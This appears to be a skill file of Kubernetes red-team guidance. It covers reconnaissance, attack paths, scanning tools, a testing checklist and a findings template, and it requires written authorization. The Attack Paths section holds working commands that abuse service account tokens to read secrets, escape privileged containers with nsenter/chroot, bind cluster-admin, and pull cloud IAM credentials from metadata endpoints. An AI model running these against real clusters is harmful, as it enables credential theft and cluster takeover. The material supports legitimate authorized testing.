# Kubernetes Security Red Team

Expert knowledge for offensive security testing of Kubernetes platforms including penetration testing, attack paths, and vulnerability assessment.

## Keywords

kubernetes, security, red team, penetration testing, pentest, attack, exploit, privilege escalation, container escape, rbac, secrets, vulnerability, assessment, offensive

## When to Use This Skill

- Conducting authorized penetration tests
- Performing security assessments
- Running red team exercises
- Testing security controls
- Identifying attack paths
- Validating hardening measures

**IMPORTANT**: Only use these techniques on systems you have explicit written authorization to test.

## Related Skills

- [k8s-security-hardening](../k8s-security-hardening) - What defenses to test
- [k8s-platform-tenancy](../k8s-platform-tenancy) - Tenant isolation to test
- [Shared: RBAC Patterns](../_shared/references/rbac-patterns.md) - RBAC to audit

## Quick Reference

| Task | Command |
|------|---------|
| Check permissions | `kubectl auth can-i --list` |
| Find privileged pods | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.containers[].securityContext.privileged==true)'` |
| List secrets | `kubectl get secrets -A` |
| Test anonymous access | `kubectl --as=system:anonymous auth can-i --list` |

## Attack Surface

### External
- Kubernetes API (TCP 6443)
- Ingress controllers (TCP 80, 443)
- NodePort services (TCP 30000-32767)
- Exposed dashboards
- Cloud metadata endpoints

### Internal (from compromised pod)
- Service account tokens
- Secrets in environment/volumes
- Network connectivity
- Mounted volumes
- Cloud IMDS

## Reconnaissance

### External
```bash
# Port scan
nmap -sV -p 6443,443,80,30000-32767 ${TARGET}

# Check anonymous access
curl -k https://${API_SERVER}:6443/api/v1/namespaces

# Test anonymous auth
kubectl --server=https://${API}:6443 --insecure-skip-tls-verify auth can-i --list
```

### Internal (from pod)
```bash
# Current permissions
kubectl auth can-i --list

# SA token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate
kubectl get namespaces
kubectl get secrets -A
kubectl get pods -A -o wide
```

## Attack Paths

### 1. Service Account Token Abuse
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets
```

### 2. Privileged Container Escape
```bash
# Mount host filesystem
mkdir /host && mount /dev/sda1 /host
chroot /host

# Or nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### 3. RBAC Escalation
```bash
# Check dangerous permissions
kubectl auth can-i escalate roles
kubectl auth can-i bind clusterroles
kubectl auth can-i impersonate users
kubectl auth can-i create pods/exec

# Escalate if can create rolebindings
kubectl create rolebinding pwn --clusterrole=cluster-admin --user=$(whoami)
```

### 4. Cloud Metadata Exploitation

**AWS:**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**GCP:**
```bash
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**
```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Cloud-Specific Attacks

### AWS EKS
- IRSA token theft from projected SA volumes
- Node IAM role abuse via IMDS
- aws-auth ConfigMap manipulation
- EKS cluster role misconfiguration

### GCP GKE
- Workload Identity token theft
- Metadata concealment bypass
- GKE node service account abuse
- Anthos Config Management exploitation

### Azure AKS
- Azure AD Pod Identity abuse
- Managed Identity exploitation
- AKS RBAC misconfiguration
- Key Vault access via MI

## Vulnerability Assessment Tools

### Installation
```bash
# kube-hunter
pip install kube-hunter

# kubescape
brew install kubescape

# trivy
brew install trivy
```

### Running Scans
```bash
# kube-hunter (external)
kube-hunter --remote ${CLUSTER_IP}

# kube-hunter (internal)
kube-hunter --pod

# kubescape
kubescape scan framework nsa,mitre

# trivy cluster scan
trivy k8s --report summary cluster
```

## Testing Checklist

### Authentication
- [ ] Anonymous API access
- [ ] Default dashboard credentials
- [ ] Weak service account tokens
- [ ] Missing token expiration

### Authorization
- [ ] Overly permissive RBAC
- [ ] Privilege escalation paths
- [ ] Cross-namespace access
- [ ] Wrong secret access

### Network
- [ ] Missing network policies
- [ ] Unrestricted pod traffic
- [ ] Metadata endpoint access
- [ ] External exposure

### Container
- [ ] Privileged containers
- [ ] Host namespace access
- [ ] Writable root filesystem
- [ ] Capabilities not dropped

## MITRE ATT&CK Mapping

| Technique | ID | Test |
|-----------|-----|------|
| Valid Accounts | T1078 | Token leakage |
| Container Admin | T1609 | kubectl exec |
| Escape to Host | T1611 | Privileged abuse |
| Credential Access | T1555 | Secret enumeration |
| Lateral Movement | T1021 | Pod-to-pod access |

## Reporting

### Finding Template
```markdown
## [CRITICAL/HIGH/MEDIUM/LOW] Finding Title

**Description**: What the vulnerability is

**Impact**: What an attacker could do

**Evidence**:
- Commands and output

**Affected Resources**:
- Specific resources

**Remediation**:
1. Immediate fix
2. Long-term solution

**References**:
- CIS control
- MITRE technique
```

## Ethical Guidelines

1. **Written authorization** required before testing
2. **Scope clearly defined** and respected
3. **No production data** exfiltration
4. **Report all findings** responsibly
5. **Clean up** any artifacts created
6. **Document everything** for reproducibility
